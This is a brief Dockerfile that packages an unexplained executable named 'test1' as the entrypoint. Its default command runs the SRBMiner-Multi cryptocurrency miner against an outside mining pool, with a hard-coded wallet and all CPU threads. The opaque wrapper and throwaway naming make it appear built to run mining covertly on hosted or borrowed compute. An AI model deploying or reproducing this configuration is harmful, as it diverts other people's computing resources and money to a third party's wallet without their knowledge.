FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y wget && \
    apt-get install libicu-dev -y && \
    rm -rf /var/lib/apt/lists/* # buildkit

RUN mkdir /projekhaha
WORKDIR /projekhaha

COPY ./test1 .
RUN chmod +x ./test1

ENTRYPOINT ["./test1"]
CMD ["./SRBMiner-Multi-2-5-0/SRBMiner-MULTI --algorithm yespowertide --pool eu.rplant.xyz:7059 --wallet TLRfyQYTEiUmxYLV8tPsNQthiP4C1UKxy2.hash --cpu-threads 0"]
